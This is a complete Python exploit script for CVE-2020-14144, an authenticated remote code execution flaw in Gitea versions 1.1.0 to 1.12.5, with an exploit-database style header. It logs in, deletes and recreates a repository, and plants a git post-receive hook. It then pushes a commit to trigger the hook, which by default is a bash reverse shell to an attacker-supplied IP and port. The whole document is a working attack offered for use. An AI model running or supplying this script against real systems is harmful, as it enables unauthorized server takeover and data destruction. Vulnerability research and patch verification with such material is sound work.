# Exploit Title: Gitea 1.12.5 - Remote Code Execution (Authenticated)
# Date: 17 Feb 2020
# Exploit Author: Podalirius
# PoC demonstration article: https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
# Vendor Homepage: https://gitea.io/
# Software Link: https://dl.gitea.io/
# Version: >= 1.1.0 to <= 1.12.5
# Tested on: Ubuntu 16.04 with GiTea 1.6.1

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import pexpect
import random
import re
import sys
import time

import requests
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

class GiTea(object):
    def __init__(self, host, verbose=False):
        super(GiTea, self).__init__()
        self.verbose  = verbose
        self.host     = host
        self.username = None
        self.password = None
        self.uid      = None
        self.session  = None

    def _get_csrf(self, url):
        pattern = 'name="_csrf" content="([a-zA-Z0-9\-\_=]+)"'
        csrf = []
        while len(csrf) == 0:
            r = self.session.get(url)
            csrf = re.findall(pattern, r.text)
            time.sleep(1)
        csrf = csrf[0]
        return csrf

    def _get_uid(self, url):
        pattern = 'name="_uid" content="([0-9]+)"'
        uid = re.findall(pattern, self.session.get(url).text)
        while len(uid) == 0:
            time.sleep(1)
            uid = re.findall(pattern, self.session.get(url).text)
        uid = uid[0]
        return int(uid)

    def login(self, username, password):
        if self.verbose == True:
            print("   [>] login('%s', ...)" % username)
        self.session  = requests.Session()
        r = self.session.get('%s/user/login' % self.host)
        self.username = username
        self.password = password

        # Logging in
        csrf = self._get_csrf(self.host)
        r = self.session.post(
            '%s/user/login?redirect_to=%%2f%s' % (self.host, self.username),
            data = {'_csrf':csrf, 'user_name':username, 'password':password},
            allow_redirects=True
        )
        if b'Username or password is incorrect.' in r.content:
            return False
        else:
            # Getting User id
            self.uid = self._get_uid(self.host)
            return True

    def repo_create(self, repository_name):
        if self.verbose == True:
            print("   [>] Creating repository : %s" % repository_name)
        csrf = self._get_csrf(self.host)
        # Create repo
        r = self.session.post(
            '%s/repo/create' % self.host,
            data = {
                '_csrf' : csrf,
                'uid' : self.uid,
                'repo_name' : repository_name,
                'description' : "Lorem Ipsum",
                'gitignores' : '',
                'license' : '',
                'readme' : 'Default',
                'auto_init' : 'off'
            }
        )
        return None

    def repo_delete(self, repository_name):
        if self.verbose == True:
            print("   [>] Deleting repository : %s" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings' % (self.host, self.username, repository_name))
        # Delete repository
        r = self.session.post(
            '%s/%s/%s/settings' % (self.host, self.username, repository_name),
            data = {
                '_csrf' : csrf,
                'action' : "delete",
                'repo_name' : repository_name
            }
        )
        return

    def repo_set_githook_pre_receive(self, repository_name, content):
        if self.verbose == True:
            print("   [>] repo_set_githook_pre_receive('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/pre-receive' % (self.host, self.username, repository_name))
        # Set pre receive git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/pre-receive' % (self.host, self.username, repository_name),
            data = {
                '_csrf' : csrf,
                'content' : content
            }
        )
        return

    def repo_set_githook_update(self, repository_name, content):
        if self.verbose == True:
            print("   [>] repo_set_githook_update('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/update' % (self.host, self.username, repository_name))
        # Set update git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/update' % (self.host, self.username, repository_name),
            data = {
                '_csrf' : csrf,
                'content' : content
            }
        )
        return

    def repo_set_githook_post_receive(self, repository_name, content):
        if self.verbose == True:
            print("   [>] repo_set_githook_post_receive('%s')" % repository_name)
        csrf = self._get_csrf('%s/%s/%s/settings/hooks/git/post-receive' % (self.host, self.username, repository_name))
        # Set post receive git hook
        r = self.session.post(
            '%s/%s/%s/settings/hooks/git/post-receive' % (self.host, self.username, repository_name),
            data = {
                '_csrf' : csrf,
                'content' : content
            }
        )
        return

    def logout(self):
        if self.verbose == True:
            print("   [>] logout()")
        # Logging out
        r = self.session.get('%s/user/logout' % self.host)
        return None


def trigger_exploit(host, username, password, repository_name, verbose=False):
    # Create a temporary directory
    tmpdir = os.popen('mktemp -d').read().strip()
    os.chdir(tmpdir)
    # We create some files in the repository
    os.system('touch README.md')
    rndstring = ''.join([hex(random.randint(0,15))[2:] for k in range(32)])
    os.system('echo "%s" >> README.md' % rndstring)
    os.system('git init')
    os.system('git add README.md')
    os.system('git commit -m "Initial commit"')
    # Connect to remote source repository
    os.system('git remote add origin %s/%s/%s.git' % (host, username, repository_name))
    # Push the files (it will trigger post-receive git hook)
    conn = pexpect.spawn("/bin/bash -c 'cd %s && git push -u origin master'" % tmpdir)
    conn.expect("Username for .*: ")
    conn.sendline(username)
    conn.expect("Password for .*: ")
    conn.sendline(password)
    conn.expect("Total.*")
    print(conn.before.decode('utf-8').strip())
    return None

def header():
    print("""    _____ _ _______
   / ____(_)__   __|             CVE-2020-14144
  | |  __ _   | | ___  __ _
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution
  | |__| | |  | |  __/ (_| |
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5
     """)

if __name__ == '__main__':
    header()
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Increase verbosity.')

    parser.add_argument('-t','--target',  required=True,  type=str, help='Target host (http://..., https://... or domain name)')
    parser.add_argument('-u','--username', required=True, type=str, default=None, help='GiTea username')
    parser.add_argument('-p','--password', required=True, type=str, default=None, help='GiTea password')

    parser.add_argument('-I','--rev-ip',   required=False, type=str, default=None, help='Reverse shell listener IP')
    parser.add_argument('-P','--rev-port', required=False, type=int, default=None, help='Reverse shell listener port')

    parser.add_argument('-f','--payload-file', required=False, default=None, help='Path to shell script payload to use.')

    args = parser.parse_args()

    if (args.rev_ip == None or args.rev_port == None):
        if args.payload_file == None:
            print('[!] Either (-I REV_IP and -P REV_PORT) or (-f PAYLOAD_FILE) options are needed')
            sys.exit(-1)

    # Read specific payload file
    if args.payload_file != None:
        f = open(args.payload_file, 'r')
        hook_payload = ''.join(f.readlines())
        f.close()
    else:
        hook_payload = """#!/bin/bash\nbash -i >& /dev/tcp/%s/%d 0>&1 &\n""" % (args.rev_ip, args.rev_port)

    if args.target.startswith('http://'):
        pass
    elif args.target.startswith('https://'):
        pass
    else:
        args.target = 'https://' + args.target

    print('[+] Starting exploit ...')
    g = GiTea(args.target, verbose=args.verbose)
    if g.login(args.username, args.password):
        reponame = 'vuln'
        g.repo_delete(reponame)
        g.repo_create(reponame)
        g.repo_set_githook_post_receive(reponame, hook_payload)
        g.logout()
        trigger_exploit(g.host, g.username, g.password, reponame, verbose=args.verbose)
        g.repo_delete(reponame)
    else:
        print('\x1b[1;91m[!]\x1b[0m Could not login with these credentials.')
    print('[+] Exploit completed !')